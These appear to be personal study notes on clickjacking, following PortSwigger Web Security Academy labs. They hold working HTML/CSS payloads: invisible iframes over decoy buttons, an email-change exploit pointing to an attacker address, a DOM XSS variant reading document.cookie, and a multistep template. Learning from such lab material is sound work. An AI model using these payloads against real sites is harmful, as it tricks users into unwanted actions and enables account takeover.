# ClickJacking (UI redressing)

![ClickJacking.png](ClickJacking%20(UI%20redressing)%205277059bf75746e0827956abf6aeb714/ClickJacking.png)

## click-Jacking

- it is an interface based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
- `Example:`
- A web user access a decoy website (i.e link provided by `phishing mail`) and click on a button to win a prize.
- unknowingly, they have been deceived by an attacker into pressing an alternative hidden button and this result in `payment to the attacker or any thing like purchasing subscription to attacker etc`.
- this is example of `clickjacking attack`
- the technique is depend on the `actionable and invisible webpage`
- `Note:` this attack is different from the `CSRF` because in `CSRF we do unintentionable action without user's knowledge and intraction` while in `Clickjacking` user need to click button which trigger hidden iframe or link to do certain tasks.
- Protection against CSRF attacks is often provided by the use of a `CSRF token` a session-specific, single-use number or nonce. `Clickjacking` attacks are not mitigated by the `CSRF token` as a target session is established with content loaded from an authentic website and with all requests happening on-domain. `CSRF tokens` are placed into requests and passed to the server as part of a normally behaved session. The difference compared to a normal user session is that the process occurs within a hidden iframe.

# how to construct basic clickjacking attack

- it use CSS to create and manipulate layers
- `Example:`

```
<head>
  <style>
    #target_website {
      position:relative;
      width:128px;
      height:128px;
      opacity:0.00001;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>
...
<body>
  <div id="decoy_website">
  ...decoy web content here...
  </div>
  <iframe id="target_website" src="<https://vulnerable-website.com>">
  </iframe>
</body>

```

adjust buttons to the iframe button and send to victim

another exploit

```
<style>
   iframe {
       position:relative;
       width:700px;
       height: 500px;
       opacity: 0.000001;
       z-index: 2;
   }
   div {
       position:absolute;
       top: 450px;
       left: 80px;
       z-index: 1;
   }
</style>
<div>Click</div>
<iframe sandbox="allow-forms" src="<https://ac541f881fc916be80be6fa300d3000a.web-security-academy.net/my-account/?email=hacker@attacker-website.com>"></iframe>

```

## Combining Clickjacking with DOM XSS attack

exploit

```
<style>
   iframe {
       position:relative;
       width:700;
       height: 500;
       opacity: 0.00001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:410;
       left:80;
       z-index: 1;
   }
</style>
<div>Test me</div>
<iframe
src="$url?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>

```

## Multistep Clickjacking

- Attacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed. These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy.

```
<style>
   iframe {
       position:relative;
       width:700px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:450px;
       left:55px;
       z-index: 1;
   }
   .secondClick {
       top:535px;
       left:55px;
   }
</style>
<div class="firstClick">Click me First</div>
<div class="secondClick">Click me next</div>
<iframe src="<https://ac7a1fcf1f6afc5080da19c4004e0043.web-security-academy.net/my-account/>"></iframe>

```

## Protecting Against ClickJacking

### [portswigger-web-security](https://portswigger.net/web-security/clickjacking)